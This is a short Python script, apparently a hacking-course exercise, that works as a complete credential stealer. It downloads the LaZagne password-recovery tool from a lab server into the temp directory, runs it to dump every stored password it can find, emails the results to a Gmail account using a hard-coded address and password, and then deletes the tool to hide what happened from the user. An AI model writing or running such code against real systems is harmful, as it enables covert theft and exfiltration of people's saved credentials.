#!/usr/bin/env python
import requests
import smtplib
import subprocess
import os
import tempfile


def download(url):
    # download file from the url
    get_response = requests.get(url)
    # print(get_response.content)

    # on split l'url en list par les / et on recupère le dernier élément
    file_name = url.split("/")[-1]

    # writing on disk
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


# command send_mail
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
# download
download("http://10.0.2.16/evil-files/laZagne.exe")
# execute
result = subprocess.check_output("laZagne.exe all", shell=True)
# send
send_mail("jhnwck70@gmail.com", "abc123abs12", result)

# hide the action from the user
os.remove("laZagne.exe")

# C:\Python 27\python.exe download_execute_any_report.py
